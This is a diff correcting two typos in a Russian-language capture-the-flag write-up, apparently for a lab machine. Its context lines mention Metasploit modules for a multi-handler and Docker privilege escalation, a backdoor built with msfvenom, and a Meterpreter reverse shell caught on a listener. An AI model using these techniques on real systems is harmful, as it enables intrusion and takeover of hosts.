@@ -651,7 +651,7 @@ aba48699????????????????????????
   * `exploit/multi/handler` (msf);
   * `linux/local/docker_daemon_privilege_escalation` (msf).
 
-Для удобства я поднял ssh-master-соединение, а всякие бэкдоры перекидывал через ssh-slave, чтобы не простукивать порты каждый раз. Как настроить такое поведение SSH'а ("SSH Multiplexing") расказывается, например, [здесь](https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Multiplexing#Setting_Up_Multiplexing "OpenSSH/Cookbook/Multiplexing - Wikibooks, open books for an open world").
+Для удобства я поднял ssh-master-соединение, а всякие бэкдоры перекидывал через ssh-slave, чтобы не простукивать порты каждый раз. Как настроить такое поведение SSH'а ("SSH Multiplexing") рассказывается, например, [здесь](https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Multiplexing#Setting_Up_Multiplexing "OpenSSH/Cookbook/Multiplexing - Wikibooks, open books for an open world").
 
 Крафтим бэкдор веномом:
 ```text
@@ -697,7 +697,7 @@ msf exploit(multi/handler) > run
 	[*] Started reverse TCP handler on 10.10.14.230:4444
 ```
 
-Активируем бэкдор на промете и ловим сессию:
+Активируем бэкдор на прометее и ловим сессию:
 ```text
 [*] Meterpreter session 1 opened (10.10.14.230:4444 -> 10.10.10.83:48154) at 2018-08-26 11:02:13 -0400
 ```
